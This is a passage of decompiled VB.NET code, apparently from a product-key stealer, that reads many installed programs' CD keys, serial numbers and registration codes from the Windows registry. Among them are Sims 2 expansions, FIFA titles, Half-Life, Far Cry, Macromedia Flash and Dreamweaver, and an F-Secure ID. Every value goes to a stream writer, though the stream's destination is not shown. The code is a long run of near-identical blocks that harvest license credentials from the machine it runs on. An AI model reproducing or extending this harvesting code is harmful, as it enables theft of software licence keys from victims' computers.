					goto IL_19cb;
					IL_19cb:
					num = 402;
					streamWriter.WriteLine("The Sims 2 Pets");
					goto IL_19de;
					IL_19de:
					num = 403;
					value58 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Pets", "ergc", null));
					goto IL_19fc;
					IL_19fc:
					num = 404;
					streamWriter.WriteLine(value58);
					goto IL_1a0c;
					IL_1a0c:
					num = 405;
					streamWriter.Flush();
					goto IL_1a1a;
					IL_1a1a:
					num = 406;
					streamWriter.WriteLine("");
					goto IL_1a2d;
					IL_1a2d:
					num = 407;
					streamWriter.Flush();
					goto IL_1a3b;
					IL_1a3b:
					ProjectData.ClearProjectError();
					num3 = -60;
					goto IL_1a44;
					IL_1a44:
					num = 409;
					streamWriter.WriteLine("The Sims 2 Seasons");
					goto IL_1a57;
					IL_1a57:
					num = 410;
					value59 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Seasons", "ergc", null));
					goto IL_1a75;
					IL_1a75:
					num = 411;
					streamWriter.WriteLine(value59);
					goto IL_1a85;
					IL_1a85:
					num = 412;
					streamWriter.Flush();
					goto IL_1a93;
					IL_1a93:
					num = 413;
					streamWriter.WriteLine("");
					goto IL_1aa6;
					IL_1aa6:
					num = 414;
					streamWriter.Flush();
					goto IL_1ab4;
					IL_1ab4:
					ProjectData.ClearProjectError();
					num3 = -61;
					goto IL_1abd;
					IL_1abd:
					num = 416;
					streamWriter.WriteLine("The Sims 2 Glamour Life Stuff");
					goto IL_1ad0;
					IL_1ad0:
					num = 417;
					value60 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff", "ergc", null));
					goto IL_1aee;
					IL_1aee:
					num = 418;
					streamWriter.WriteLine(value60);
					goto IL_1afe;
					IL_1afe:
					num = 419;
					streamWriter.Flush();
					goto IL_1b0c;
					IL_1b0c:
					num = 420;
					streamWriter.WriteLine("");
					goto IL_1b1f;
					IL_1b1f:
					num = 421;
					streamWriter.Flush();
					goto IL_1b2d;
					IL_1b2d:
					ProjectData.ClearProjectError();
					num3 = -62;
					goto IL_1b36;
					IL_1b36:
					num = 423;
					streamWriter.WriteLine("The Sims 2 Celebration Stuff");
					goto IL_1b49;
					IL_1b49:
					num = 424;
					value61 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Celebration Stuff", "ergc", null));
					goto IL_1b67;
					IL_1b67:
					num = 425;
					streamWriter.WriteLine(value61);
					goto IL_1b77;
					IL_1b77:
					num = 426;
					streamWriter.Flush();
					goto IL_1b85;
					IL_1b85:
					num = 427;
					streamWriter.WriteLine("");
					goto IL_1b98;
					IL_1b98:
					num = 428;
					streamWriter.Flush();
					goto IL_1ba6;
					IL_1ba6:
					ProjectData.ClearProjectError();
					num3 = -63;
					goto IL_1baf;
					IL_1baf:
					num = 430;
					streamWriter.WriteLine("The Sims 2 H M Fashion Stuff");
					goto IL_1bc2;
					IL_1bc2:
					num = 431;
					value62 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 H M Fashion Stuff", "ergc", null));
					goto IL_1be0;
					IL_1be0:
					num = 432;
					streamWriter.WriteLine(value62);
					goto IL_1bf0;
					IL_1bf0:
					num = 433;
					streamWriter.Flush();
					goto IL_1bfe;
					IL_1bfe:
					num = 434;
					streamWriter.WriteLine("");
					goto IL_1c11;
					IL_1c11:
					num = 435;
					streamWriter.Flush();
					goto IL_1c1f;
					IL_1c1f:
					ProjectData.ClearProjectError();
					num3 = -64;
					goto IL_1c28;
					IL_1c28:
					num = 437;
					streamWriter.WriteLine("The Sims 2 Family Fun Stuff");
					goto IL_1c3b;
					IL_1c3b:
					num = 438;
					value63 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff", "ergc", null));
					goto IL_1c59;
					IL_1c59:
					num = 439;
					streamWriter.WriteLine(value63);
					goto IL_1c69;
					IL_1c69:
					num = 440;
					streamWriter.Flush();
					goto IL_1c77;
					IL_1c77:
					num = 441;
					streamWriter.WriteLine("");
					goto IL_1c8a;
					IL_1c8a:
					num = 442;
					streamWriter.Flush();
					goto IL_1c98;
					IL_1c98:
					ProjectData.ClearProjectError();
					num3 = -65;
					goto IL_1ca1;
					IL_1ca1:
					num = 444;
					streamWriter.WriteLine("DVD Audio Extractor (Name)");
					goto IL_1cb4;
					IL_1cb4:
					num = 445;
					value64 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Name", null));
					goto IL_1cd2;
					IL_1cd2:
					num = 446;
					streamWriter.WriteLine(value64);
					goto IL_1ce2;
					IL_1ce2:
					num = 447;
					streamWriter.Flush();
					goto IL_1cf0;
					IL_1cf0:
					num = 448;
					streamWriter.WriteLine("");
					goto IL_1d03;
					IL_1d03:
					num = 449;
					streamWriter.Flush();
					goto IL_1d11;
					IL_1d11:
					ProjectData.ClearProjectError();
					num3 = -66;
					goto IL_1d1a;
					IL_1d1a:
					num = 451;
					streamWriter.WriteLine("DVD Audio Extractor (Serial)");
					goto IL_1d2d;
					IL_1d2d:
					num = 452;
					value65 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Number", null));
					goto IL_1d4b;
					IL_1d4b:
					num = 453;
					streamWriter.WriteLine(value65);
					goto IL_1d5b;
					IL_1d5b:
					num = 454;
					streamWriter.Flush();
					goto IL_1d69;
					IL_1d69:
					num = 455;
					streamWriter.WriteLine("");
					goto IL_1d7c;
					IL_1d7c:
					num = 456;
					streamWriter.Flush();
					goto IL_1d8a;
					IL_1d8a:
					ProjectData.ClearProjectError();
					num3 = -67;
					goto IL_1d93;
					IL_1d93:
					num = 458;
					streamWriter.WriteLine("Empire Earth II");
					goto IL_1da6;
					IL_1da6:
					num = 459;
					value66 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\Empire Earth II", "CDKey", null));
					goto IL_1dc4;
					IL_1dc4:
					num = 460;
					streamWriter.WriteLine(value66);
					goto IL_1dd4;
					IL_1dd4:
					num = 461;
					streamWriter.Flush();
					goto IL_1de2;
					IL_1de2:
					num = 462;
					streamWriter.WriteLine("");
					goto IL_1df5;
					IL_1df5:
					num = 463;
					streamWriter.Flush();
					goto IL_1e03;
					IL_1e03:
					ProjectData.ClearProjectError();
					num3 = -68;
					goto IL_1e0c;
					IL_1e0c:
					num = 465;
					streamWriter.WriteLine("F.E.A.R");
					goto IL_1e1f;
					IL_1e1f:
					num = 466;
					value67 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "fear", null));
					goto IL_1e3d;
					IL_1e3d:
					num = 467;
					streamWriter.WriteLine(value67);
					goto IL_1e4d;
					IL_1e4d:
					num = 468;
					streamWriter.Flush();
					goto IL_1e5b;
					IL_1e5b:
					num = 469;
					streamWriter.WriteLine("");
					goto IL_1e6e;
					IL_1e6e:
					num = 470;
					streamWriter.Flush();
					goto IL_1e7c;
					IL_1e7c:
					ProjectData.ClearProjectError();
					num3 = -69;
					goto IL_1e85;
					IL_1e85:
					num = 472;
					streamWriter.WriteLine("F-Secure");
					goto IL_1e98;
					IL_1e98:
					num = 473;
					value68 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\F-Secure\\BackWeb\\iLauncher", "UID", null));
					goto IL_1eb6;
					IL_1eb6:
					num = 474;
					streamWriter.WriteLine(value68);
					goto IL_1ec6;
					IL_1ec6:
					num = 475;
					streamWriter.Flush();
					goto IL_1ed4;
					IL_1ed4:
					num = 476;
					streamWriter.WriteLine("");
					goto IL_1ee7;
					IL_1ee7:
					num = 477;
					streamWriter.Flush();
					goto IL_1ef5;
					IL_1ef5:
					ProjectData.ClearProjectError();
					num3 = -70;
					goto IL_1efe;
					IL_1efe:
					num = 479;
					streamWriter.WriteLine("FARCRY");
					goto IL_1f11;
					IL_1f11:
					num = 480;
					value69 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM", "CDKey", null));
					goto IL_1f2f;
					IL_1f2f:
					num = 481;
					streamWriter.WriteLine(value69);
					goto IL_1f3f;
					IL_1f3f:
					num = 482;
					streamWriter.Flush();
					goto IL_1f4d;
					IL_1f4d:
					num = 483;
					streamWriter.WriteLine("");
					goto IL_1f60;
					IL_1f60:
					num = 484;
					streamWriter.Flush();
					goto IL_1f6e;
					IL_1f6e:
					ProjectData.ClearProjectError();
					num3 = -71;
					goto IL_1f77;
					IL_1f77:
					num = 486;
					streamWriter.WriteLine("");
					goto IL_1f8a;
					IL_1f8a:
					num = 487;
					value70 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY2\\UBI.COM", "CDKey", null));
					goto IL_1fa8;
					IL_1fa8:
					num = 488;
					streamWriter.WriteLine(value70);
					goto IL_1fb8;
					IL_1fb8:
					num = 489;
					streamWriter.Flush();
					goto IL_1fc6;
					IL_1fc6:
					num = 490;
					streamWriter.WriteLine("");
					goto IL_1fd9;
					IL_1fd9:
					num = 491;
					streamWriter.Flush();
					goto IL_1fe7;
					IL_1fe7:
					ProjectData.ClearProjectError();
					num3 = -72;
					goto IL_1ff0;
					IL_1ff0:
					num = 493;
					streamWriter.WriteLine("FIFA 2002");
					goto IL_2003;
					IL_2003:
					num = 494;
					value71 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002", "ergc", null));
					goto IL_2021;
					IL_2021:
					num = 495;
					streamWriter.WriteLine(value71);
					goto IL_2031;
					IL_2031:
					num = 496;
					streamWriter.Flush();
					goto IL_203f;
					IL_203f:
					num = 497;
					streamWriter.WriteLine("");
					goto IL_2052;
					IL_2052:
					num = 498;
					streamWriter.Flush();
					goto IL_2060;
					IL_2060:
					ProjectData.ClearProjectError();
					num3 = -73;
					goto IL_2069;
					IL_2069:
					num = 500;
					streamWriter.WriteLine("FIFA 2003");
					goto IL_207c;
					IL_207c:
					num = 501;
					value72 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003", "ergc", null));
					goto IL_209a;
					IL_209a:
					num = 502;
					streamWriter.WriteLine(value72);
					goto IL_20aa;
					IL_20aa:
					num = 503;
					streamWriter.Flush();
					goto IL_20b8;
					IL_20b8:
					num = 504;
					streamWriter.WriteLine("");
					goto IL_20cb;
					IL_20cb:
					num = 505;
					streamWriter.Flush();
					goto IL_20d9;
					IL_20d9:
					ProjectData.ClearProjectError();
					num3 = -74;
					goto IL_20e2;
					IL_20e2:
					num = 507;
					streamWriter.WriteLine("FIFA 2004");
					goto IL_20f5;
					IL_20f5:
					num = 508;
					value73 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2004", "ergc", null));
					goto IL_2113;
					IL_2113:
					num = 509;
					streamWriter.WriteLine(value73);
					goto IL_2123;
					IL_2123:
					num = 510;
					streamWriter.Flush();
					goto IL_2131;
					IL_2131:
					num = 511;
					streamWriter.WriteLine("");
					goto IL_2144;
					IL_2144:
					num = 512;
					streamWriter.Flush();
					goto IL_2152;
					IL_2152:
					ProjectData.ClearProjectError();
					num3 = -75;
					goto IL_215b;
					IL_215b:
					num = 514;
					streamWriter.WriteLine("FIFA 2005");
					goto IL_216e;
					IL_216e:
					num = 515;
					value74 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2005", "ergc", null));
					goto IL_218c;
					IL_218c:
					num = 516;
					streamWriter.WriteLine(value74);
					goto IL_219c;
					IL_219c:
					num = 517;
					streamWriter.Flush();
					goto IL_21aa;
					IL_21aa:
					num = 518;
					streamWriter.WriteLine("");
					goto IL_21bd;
					IL_21bd:
					num = 519;
					streamWriter.Flush();
					goto IL_21cb;
					IL_21cb:
					ProjectData.ClearProjectError();
					num3 = -76;
					goto IL_21d4;
					IL_21d4:
					num = 521;
					streamWriter.WriteLine("FIFA 07");
					goto IL_21e7;
					IL_21e7:
					num = 522;
					value75 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 07", "ergc", null));
					goto IL_2205;
					IL_2205:
					num = 523;
					streamWriter.WriteLine(value75);
					goto IL_2215;
					IL_2215:
					num = 524;
					streamWriter.Flush();
					goto IL_2223;
					IL_2223:
					num = 525;
					streamWriter.WriteLine("");
					goto IL_2236;
					IL_2236:
					num = 526;
					streamWriter.Flush();
					goto IL_2244;
					IL_2244:
					ProjectData.ClearProjectError();
					num3 = -77;
					goto IL_224d;
					IL_224d:
					num = 528;
					streamWriter.WriteLine("FIFA 08");
					goto IL_2260;
					IL_2260:
					num = 529;
					value76 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\FIFA 08", "ergc", null));
					goto IL_227e;
					IL_227e:
					num = 530;
					streamWriter.WriteLine(value76);
					goto IL_228e;
					IL_228e:
					num = 531;
					streamWriter.Flush();
					goto IL_229c;
					IL_229c:
					num = 532;
					streamWriter.WriteLine("");
					goto IL_22af;
					IL_22af:
					num = 533;
					streamWriter.Flush();
					goto IL_22bd;
					IL_22bd:
					ProjectData.ClearProjectError();
					num3 = -78;
					goto IL_22c6;
					IL_22c6:
					num = 535;
					streamWriter.WriteLine("Freedom Force");
					goto IL_22d9;
					IL_22d9:
					num = 536;
					value77 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force", "ergc", null));
					goto IL_22f7;
					IL_22f7:
					num = 537;
					streamWriter.WriteLine(value77);
					goto IL_2307;
					IL_2307:
					num = 538;
					streamWriter.Flush();
					goto IL_2315;
					IL_2315:
					num = 539;
					streamWriter.WriteLine("");
					goto IL_2328;
					IL_2328:
					num = 540;
					streamWriter.Flush();
					goto IL_2336;
					IL_2336:
					ProjectData.ClearProjectError();
					num3 = -79;
					goto IL_233f;
					IL_233f:
					num = 542;
					streamWriter.WriteLine("Frontlines: Fuel of War Beta");
					goto IL_2352;
					IL_2352:
					num = 543;
					value78 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War Beta", "ProductKey", null));
					goto IL_2370;
					IL_2370:
					num = 544;
					streamWriter.WriteLine(value78);
					goto IL_2380;
					IL_2380:
					num = 545;
					streamWriter.Flush();
					goto IL_238e;
					IL_238e:
					num = 546;
					streamWriter.WriteLine("");
					goto IL_23a1;
					IL_23a1:
					num = 547;
					streamWriter.Flush();
					goto IL_23af;
					IL_23af:
					ProjectData.ClearProjectError();
					num3 = -80;
					goto IL_23b8;
					IL_23b8:
					num = 549;
					streamWriter.WriteLine("Frontlines: Fuel of War");
					goto IL_23cb;
					IL_23cb:
					num = 550;
					value79 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War", "ProductKey", null));
					goto IL_23e9;
					IL_23e9:
					num = 551;
					streamWriter.WriteLine(value79);
					goto IL_23f9;
					IL_23f9:
					num = 552;
					streamWriter.Flush();
					goto IL_2407;
					IL_2407:
					num = 553;
					streamWriter.WriteLine("");
					goto IL_241a;
					IL_241a:
					num = 554;
					streamWriter.Flush();
					goto IL_2428;
					IL_2428:
					ProjectData.ClearProjectError();
					num3 = -81;
					goto IL_2431;
					IL_2431:
					num = 556;
					streamWriter.WriteLine("GetRight");
					goto IL_2444;
					IL_2444:
					num = 557;
					value80 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight", "GRcode", null));
					goto IL_2462;
					IL_2462:
					num = 558;
					streamWriter.WriteLine(value80);
					goto IL_2472;
					IL_2472:
					num = 559;
					streamWriter.Flush();
					goto IL_2480;
					IL_2480:
					num = 560;
					streamWriter.WriteLine("");
					goto IL_2493;
					IL_2493:
					num = 561;
					streamWriter.Flush();
					goto IL_24a1;
					IL_24a1:
					ProjectData.ClearProjectError();
					num3 = -82;
					goto IL_24aa;
					IL_24aa:
					num = 563;
					streamWriter.WriteLine("Global Operations");
					goto IL_24bd;
					IL_24bd:
					num = 564;
					value81 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations", "ergc", null));
					goto IL_24db;
					IL_24db:
					num = 565;
					streamWriter.WriteLine(value81);
					goto IL_24eb;
					IL_24eb:
					num = 566;
					streamWriter.Flush();
					goto IL_24f9;
					IL_24f9:
					num = 567;
					streamWriter.WriteLine("");
					goto IL_250c;
					IL_250c:
					num = 568;
					streamWriter.Flush();
					goto IL_251a;
					IL_251a:
					ProjectData.ClearProjectError();
					num3 = -83;
					goto IL_2523;
					IL_2523:
					num = 570;
					streamWriter.WriteLine("Gunman");
					goto IL_2536;
					IL_2536:
					num = 571;
					value82 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Gunman", "Settings", null));
					goto IL_2554;
					IL_2554:
					num = 572;
					streamWriter.WriteLine(value82);
					goto IL_2564;
					IL_2564:
					num = 573;
					streamWriter.Flush();
					goto IL_2572;
					IL_2572:
					num = 574;
					streamWriter.WriteLine("");
					goto IL_2585;
					IL_2585:
					num = 575;
					streamWriter.Flush();
					goto IL_2593;
					IL_2593:
					ProjectData.ClearProjectError();
					num3 = -84;
					goto IL_259c;
					IL_259c:
					num = 577;
					streamWriter.WriteLine("Half-Life");
					goto IL_25af;
					IL_25af:
					num = 578;
					value83 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Setting", "Key", null));
					goto IL_25cd;
					IL_25cd:
					num = 579;
					streamWriter.WriteLine(value83);
					goto IL_25dd;
					IL_25dd:
					num = 580;
					streamWriter.Flush();
					goto IL_25eb;
					IL_25eb:
					num = 581;
					streamWriter.WriteLine("");
					goto IL_25fe;
					IL_25fe:
					num = 582;
					streamWriter.Flush();
					goto IL_260c;
					IL_260c:
					ProjectData.ClearProjectError();
					num3 = -85;
					goto IL_2615;
					IL_2615:
					num = 584;
					streamWriter.WriteLine("Hellgate: London");
					goto IL_2628;
					IL_2628:
					num = 585;
					value84 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Hellgate: London", "ergc", null));
					goto IL_2646;
					IL_2646:
					num = 586;
					streamWriter.WriteLine(value84);
					goto IL_2656;
					IL_2656:
					num = 587;
					streamWriter.Flush();
					goto IL_2664;
					IL_2664:
					num = 588;
					streamWriter.WriteLine("");
					goto IL_2677;
					IL_2677:
					num = 589;
					streamWriter.Flush();
					goto IL_2685;
					IL_2685:
					ProjectData.ClearProjectError();
					num3 = -86;
					goto IL_268e;
					IL_268e:
					num = 591;
					streamWriter.WriteLine("Hidden & Dangerous 2");
					goto IL_26a1;
					IL_26a1:
					num = 592;
					value85 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key", null));
					goto IL_26bf;
					IL_26bf:
					num = 593;
					streamWriter.WriteLine(value85);
					goto IL_26cf;
					IL_26cf:
					num = 594;
					streamWriter.Flush();
					goto IL_26dd;
					IL_26dd:
					num = 595;
					streamWriter.WriteLine("");
					goto IL_26f0;
					IL_26f0:
					num = 596;
					streamWriter.Flush();
					goto IL_26fe;
					IL_26fe:
					ProjectData.ClearProjectError();
					num3 = -87;
					goto IL_2707;
					IL_2707:
					num = 598;
					streamWriter.WriteLine("IGI 2 Retail");
					goto IL_271a;
					IL_271a:
					num = 599;
					value86 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey", null));
					goto IL_2738;
					IL_2738:
					num = 600;
					streamWriter.WriteLine(value86);
					goto IL_2748;
					IL_2748:
					num = 601;
					streamWriter.Flush();
					goto IL_2756;
					IL_2756:
					num = 602;
					streamWriter.WriteLine("");
					goto IL_2769;
					IL_2769:
					num = 603;
					streamWriter.Flush();
					goto IL_2777;
					IL_2777:
					ProjectData.ClearProjectError();
					num3 = -88;
					goto IL_2780;
					IL_2780:
					num = 605;
					streamWriter.WriteLine("InCD Serial");
					goto IL_2793;
					IL_2793:
					num = 606;
					value87 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "License", null));
					goto IL_27b1;
					IL_27b1:
					num = 607;
					streamWriter.WriteLine(value87);
					goto IL_27c1;
					IL_27c1:
					num = 608;
					streamWriter.Flush();
					goto IL_27cf;
					IL_27cf:
					num = 609;
					streamWriter.WriteLine("");
					goto IL_27e2;
					IL_27e2:
					num = 610;
					streamWriter.Flush();
					goto IL_27f0;
					IL_27f0:
					ProjectData.ClearProjectError();
					num3 = -89;
					goto IL_27f9;
					IL_27f9:
					num = 612;
					streamWriter.WriteLine("InCD Username");
					goto IL_280c;
					IL_280c:
					num = 613;
					value88 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "UserName", null));
					goto IL_282a;
					IL_282a:
					num = 614;
					streamWriter.WriteLine(value88);
					goto IL_283a;
					IL_283a:
					num = 615;
					streamWriter.Flush();
					goto IL_2848;
					IL_2848:
					num = 616;
					streamWriter.WriteLine("");
					goto IL_285b;
					IL_285b:
					num = 617;
					streamWriter.Flush();
					goto IL_2869;
					IL_2869:
					ProjectData.ClearProjectError();
					num3 = -90;
					goto IL_2872;
					IL_2872:
					num = 619;
					streamWriter.WriteLine("IG2");
					goto IL_2885;
					IL_2885:
					num = 620;
					value89 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JoWooD\\InstalledGames\\IG2", "prvkey", null));
					goto IL_28a3;
					IL_28a3:
					num = 621;
					streamWriter.WriteLine(value89);
					goto IL_28b3;
					IL_28b3:
					num = 622;
					streamWriter.Flush();
					goto IL_28c1;
					IL_28c1:
					num = 623;
					streamWriter.WriteLine("");
					goto IL_28d4;
					IL_28d4:
					num = 624;
					streamWriter.Flush();
					goto IL_28e2;
					IL_28e2:
					ProjectData.ClearProjectError();
					num3 = -91;
					goto IL_28eb;
					IL_28eb:
					num = 626;
					streamWriter.WriteLine("iPod Converter (Registration Code)");
					goto IL_28fe;
					IL_28fe:
					num = 627;
					value90 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "Registration Code", null));
					goto IL_291c;
					IL_291c:
					num = 628;
					streamWriter.WriteLine(value90);
					goto IL_292c;
					IL_292c:
					num = 629;
					streamWriter.Flush();
					goto IL_293a;
					IL_293a:
					num = 630;
					streamWriter.WriteLine("");
					goto IL_294d;
					IL_294d:
					num = 631;
					streamWriter.Flush();
					goto IL_295b;
					IL_295b:
					ProjectData.ClearProjectError();
					num3 = -92;
					goto IL_2964;
					IL_2964:
					num = 633;
					streamWriter.WriteLine("iPod Converter (User Name)");
					goto IL_2977;
					IL_2977:
					num = 634;
					value91 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "User Name", null));
					goto IL_2995;
					IL_2995:
					num = 635;
					streamWriter.WriteLine(value91);
					goto IL_29a5;
					IL_29a5:
					num = 636;
					streamWriter.Flush();
					goto IL_29b3;
					IL_29b3:
					num = 637;
					streamWriter.WriteLine("");
					goto IL_29c6;
					IL_29c6:
					num = 638;
					streamWriter.Flush();
					goto IL_29d4;
					IL_29d4:
					ProjectData.ClearProjectError();
					num3 = -93;
					goto IL_29dd;
					IL_29dd:
					num = 640;
					streamWriter.WriteLine("James Bond 007 Nightfire");
					goto IL_29f0;
					IL_29f0:
					num = 641;
					value92 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire", "ergc", null));
					goto IL_2a0e;
					IL_2a0e:
					num = 642;
					streamWriter.WriteLine(value92);
					goto IL_2a1e;
					IL_2a1e:
					num = 643;
					streamWriter.Flush();
					goto IL_2a2c;
					IL_2a2c:
					num = 644;
					streamWriter.WriteLine("");
					goto IL_2a3f;
					IL_2a3f:
					num = 645;
					streamWriter.Flush();
					goto IL_2a4d;
					IL_2a4d:
					ProjectData.ClearProjectError();
					num3 = -94;
					goto IL_2a56;
					IL_2a56:
					num = 647;
					streamWriter.WriteLine("Status Legends of Might and Magic");
					goto IL_2a69;
					IL_2a69:
					num = 648;
					value93 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\3d0\\Status Legends of Might and Magic", "CustomerNumber", null));
					goto IL_2a87;
					IL_2a87:
					num = 649;
					streamWriter.WriteLine(value93);
					goto IL_2a97;
					IL_2a97:
					num = 650;
					streamWriter.Flush();
					goto IL_2aa5;
					IL_2aa5:
					num = 651;
					streamWriter.WriteLine("");
					goto IL_2ab8;
					IL_2ab8:
					num = 652;
					streamWriter.Flush();
					goto IL_2ac6;
					IL_2ac6:
					ProjectData.ClearProjectError();
					num3 = -95;
					goto IL_2acf;
					IL_2acf:
					num = 654;
					streamWriter.WriteLine("Macromedia Flash 7");
					goto IL_2ae2;
					IL_2ae2:
					num = 655;
					value94 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Flash\\7\\Registration", "Serial Number", null));
					goto IL_2b00;
					IL_2b00:
					num = 656;
					streamWriter.WriteLine(value94);
					goto IL_2b10;
					IL_2b10:
					num = 657;
					streamWriter.Flush();
					goto IL_2b1e;
					IL_2b1e:
					num = 658;
					streamWriter.WriteLine("");
					goto IL_2b31;
					IL_2b31:
					num = 659;
					streamWriter.Flush();
					goto IL_2b3f;
					IL_2b3f:
					ProjectData.ClearProjectError();
					num3 = -96;
					goto IL_2b48;
					IL_2b48:
					num = 661;
					streamWriter.WriteLine("Macromedia Fireworks 7");
					goto IL_2b5b;
					IL_2b5b:
					num = 662;
					value95 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Fireworks\\7\\Registration", "Serial Number", null));
					goto IL_2b79;
					IL_2b79:
					num = 663;
					streamWriter.WriteLine(value95);
					goto IL_2b89;
					IL_2b89:
					num = 664;
					streamWriter.Flush();
					goto IL_2b97;
					IL_2b97:
					num = 665;
					streamWriter.WriteLine("");
					goto IL_2baa;
					IL_2baa:
					num = 666;
					streamWriter.Flush();
					goto IL_2bb8;
					IL_2bb8:
					ProjectData.ClearProjectError();
					num3 = -97;
					goto IL_2bc1;
					IL_2bc1:
					num = 668;
					streamWriter.WriteLine("Macromedia Dreamweaver 7");
					goto IL_2bd4;
					IL_2bd4:
					num = 669;
					value96 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Dreamweaver\\7\\Registration", "Serial Number", null));
					goto IL_2bf2;
					IL_2bf2:
					num = 670;
					streamWriter.WriteLine(value96);
					goto IL_2c02;
					IL_2c02:
					num = 671;
					streamWriter.Flush();
					goto IL_2c10;
					IL_2c10:
					num = 672;
					streamWriter.WriteLine("");
					goto IL_2c23;
					IL_2c23:
					num = 673;
					streamWriter.Flush();
					goto IL_2c31;
					IL_2c31:
					ProjectData.ClearProjectError();
					num3 = -98;
					goto IL_2c3a;
					IL_2c3a:
					num = 675;
					streamWriter.WriteLine("Madden NFL 07");
					goto IL_2c4d;
					IL_2c4d:
					num = 676;
					value97 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Madden NFL 07", "ergc", null));
					goto IL_2c6b;
					IL_2c6b:
					num = 677;
					streamWriter.WriteLine(value97);
					goto IL_2c7b;
					IL_2c7b:
					num = 678;
					streamWriter.Flush();
					goto IL_2c89;
					IL_2c89:
					num = 679;
					streamWriter.WriteLine("");
					goto IL_2c9c;
					IL_2c9c:
					num = 680;
					streamWriter.Flush();
					goto IL_2caa;
					IL_2caa:
					ProjectData.ClearProjectError();
					num3 = -99;
					goto IL_2cb3;
					IL_2cb3:
					num = 682;
					streamWriter.WriteLine("Matrix Screensave");
					goto IL_2cc6;
					IL_2cc6:
					num = 683;
					value98 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JSG\\Matrix Saver V2", "Registration", null));
					goto IL_2ce4;
					IL_2ce4:
					num = 684;
					streamWriter.WriteLine(value98);
					goto IL_2cf4;
					IL_2cf4:
					num = 685;
					streamWriter.Flush();
					goto IL_2d02;
					IL_2d02:
					num = 686;
					streamWriter.WriteLine("");
					goto IL_2d15;
					IL_2d15:
					num = 687;
					streamWriter.Flush();
					goto IL_2d23;
					IL_2d23:
					ProjectData.ClearProjectError();
					num3 = -100;
					goto IL_2d2c;
